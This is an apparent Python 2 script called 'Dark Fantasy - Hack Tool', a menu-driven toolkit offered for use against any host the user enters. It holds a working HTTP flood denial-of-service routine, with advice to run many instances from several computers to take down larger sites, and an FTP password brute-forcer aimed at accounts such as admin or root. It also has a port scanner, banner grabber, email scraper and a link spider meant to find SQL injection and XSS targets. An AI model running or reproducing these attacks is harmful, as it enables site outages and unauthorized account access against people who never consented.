import sys
import socket
from datetime import datetime
import os
import urllib2
import subprocess
import html2text
import random
from time import *
from string import *
from random import *
import re

def dos(host):
    subprocess.call('cls', shell=True)
    subprocess.call('clear', shell=True)
    uagent=[]
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    print "[*]This program will use HTTP FLOOD to dos the host.\n[*]It would work only on small websites if done only for one computer.\n[*]To take down larger websites run the attack from multiple computers.\n[*] For better performance open multiple instances of this software and attack at the same time.\n"
    print "[*]Host to attack: "+host
    ip=socket.gethostbyname(host)
    print "[*]IP of the host: "+ip+"\n\n"
    conn=raw_input("Enter the number of packets to be sent(depends on the site but should be more than 2000 or 3000 for average sites): ")
    conn=int(conn)
    
    
    for i in range(conn):
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            print "Unable to create Socket. Retrying."
            continue
        random_index = randrange(len(uagent))
        try:
            s.connect((ip,80))
        except:
            print "Unable To Connect. Retrying."
            continue
        print "[*]FLOODING!"
        s.send("GET / HTTP/1.1\r\n")
        s.send("Host: "+host+"\r\n")
        s.send("User-Agent: "+uagent[random_index]+"\r\n\r\n")
        s.close()
    main()
              
    


def imdb(movie):
    subprocess.call('cls', shell=True)
    subprocess.call('clear', shell=True)
    print "[*] Accessing IMDB database...\n"
    m=urllib2.urlopen('http://www.imdb.com/find?ref_=nv_sr_fn&q='+movie.replace(' ','+')+'&s=all')
    m=m.read()
    for i in m.split('\n'):
        if "result_text" in i:
            if "/title/" in i:
                if "/title/" in i.split('href=')[1].split('>')[0].strip("\"").split("?ref")[0]:
                    link="http://www.imdb.com"+i.split('href=')[1].split('>')[0].strip("\"").split("?ref")[0]
                
    url=urllib2.urlopen(str(link))
    for line in url.read().split('\n'):
        if 'strong title' in line:
            print line.split('title=')[1].split(">")[0]
    main()
    
    
            

    

def scanner(host):
    subprocess.call('cls', shell=True)
    subprocess.call('clear', shell=True)
    t1=datetime.now()
    socket.setdefaulttimeout(2)
    print "[*] Scanning "+host
    print "[*] Starting Scanning at "+str(t1)
    host=socket.gethostbyname(host)
    print "[*] IP of host: "+host
    ports=[1,5,7,18,20,21,22,23,25,43,42,53,80,109,110,115,118,443,194,161,445,156,137,139,3306]
    try:
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((host, port))
            if result == 0:
                print "Port {}: \t Open".format(port)
            sock.close()
    
    except KeyboardInterrupt:
        print "You pressed Ctrl+C"
        main()

    except socket.gaierror:
        print 'Hostname could not be resolved. Exiting'
        main()

    except socket.error:
        print "Couldn't connect to server"
        main()
    t2=datetime.now()
    timetaken=t2-t1
    print "[*] Scanning ended at: "+str(t2)+"\n"
    print "[*] Time taken= "+str(timetaken)
    main()

    subprocess.call('cls', shell=True)
    subprocess.call('clear', shell=True)
    
def email(host):
    subprocess.call('cls', shell=True)
    subprocess.call('clear', shell=True)
    print"[*] Email addresses found on page: "
    try:
        e=urllib2.urlopen('http://'+str(host))
    except:
        print "Error"
    try:
        e=urllib2.urlopen('http://'+str(host))
    except:
        print "Error"
    try:
        cont=html2text.html2text(e.read())
    except UnicodeDecodeError :
        try:
            cont=html2text.html2text(urllib2.urlopen('http://'+str(host)).read().decode('utf-8'))
        except :
            cont=urllib2.urlopen('http://'+str(host)).read()
    cont=cont.split('\n')
    for line in cont:
        if '@' in line:
            print line
    main()

def banner(host):
    subprocess.call('cls', shell=True)
    subprocess.call('clear', shell=True)
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except:
        "Error"
    host=socket.gethostbyname(host)
    port=raw_input("[*] Enter the port of the service: ")
    try:
        s.connect((host,int(port)))
        print "[*] connection successfull\nWaiting for the banner...\n"
        if int(port)==80:
            s.send('HEAD / HTTP/1.0\r\n\r\n')
        data=s.recv(1024)
        print "\Banner:\n"+str(data)
        
        s.close()
    except:
        print "Connection failed"
    
    main()

def ftp(server):
    subprocess.call('cls', shell=True)
    subprocess.call('clear', shell=True)
    print "[*]Put the password file in the same directory.\n[*]The passwords should be on different lines.\n"
    password=[]
    passw=raw_input("Enter the password file name(eg: pass.txt, wordlist.txt): ")
    username=raw_input("Enter the username to hack(eg: admin, root): ") 
    f=open(str(passw))
    f=f.read()
    f=f.split('\n')
    for i in f:
        password.append(str(i))
        
    server=socket.gethostbyname(server)
    
    for password in password:
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            print "Unable to create Socket."
            main()
        try:
            s.connect((server,21))
        except:
            print "Unable To Connect."
            main()
        data=s.recv(1024)
        s.send('USER ' +username+ '\r\n')
        data=s.recv(1024)
        s.send('PASS ' +password+'\r\n')
        print data
        data+=" "+s.recv(1024)
        data+=" "+s.recv(1024)
        s.send("Quit\r\n")
        s.close
        print "[*] Tried: "+password+"\n"
        if "230" in data:
            print "password found\n"
            print "[*] Password is: " + password
            main()
        else:
            print '[*] '+password+" is incorrect"
    print "No password Found. Try another word list or username."

def spider(host):
    subprocess.call('cls', shell=True)
    subprocess.call('clear', shell=True)
    print "[*] Use the result to find promising URLs to try hacking using SQL injection or Xss etc.\n[*] Depth is the level to go inside the website( between 10-20 is enough usually but depends on you).\n[*] Output will also be saved in text files in the same folder as this software.\n"
    depth = raw_input("Enter the depth level in numbers: ")
    count=1
    url="http://"+host
    text=open("depth1.txt","w+")
    for i in re.findall('''href=["'](.[^"']+)["']''', urllib2.urlopen(url).read(), re.I):
        if "http" not in i:
		    i="http://"+host+i
        print i
        text.write(i+'\n')
    text.close()
    while(count<=int(depth)):
        text=open("depth"+str(count)+".txt", "r")
        text1=open("depth"+str(count+1)+".txt", "w+")
        if text.read()=="":
            print "\n****Finished****"
            main()
        f=text.read().split("\n")
        for j in f:
            if "http" not in j:
                j="http://"+host+j

            for k in re.findall('''href=["'](.[^"']+)["']''', urllib2.urlopen(j).read(), re.I):
                print k
                text1.write(k+"\n")
        text.close()
        text1.close()		
        count+=1
    main()
	
def main():
    print "-"*60+"\n"
    print "                  Dark Fantasy - Hack Tool                    "
    print "-"*60+"\n"
    print "1.Port Scanning\n2.DDOS\n3.Banner Grabbing\n4.Web spider(gather all URLs for web hacking)\n5.FTP Password Cracker\n6.Email Scraping\n7.IMDB Rating"
    choice=raw_input("Enter Your Choice: ")
    hostname=raw_input("Enter Host Site or movie name(eg:wwww.google.com, www.yahoo.com, Batman, The Flash): ")
    if choice=='1':
        scanner(hostname)
    elif choice=='6':
        email(hostname)
    elif choice=='3':
        banner(hostname)
    elif choice=='7':
        imdb(hostname)
    elif choice=='5':
        ftp(hostname)
    elif choice=='2':
        dos(hostname)
    elif choice=='4':
        spider(hostname)
    else:
        print "Wrong choice"

if __name__=='__main__':
    main()
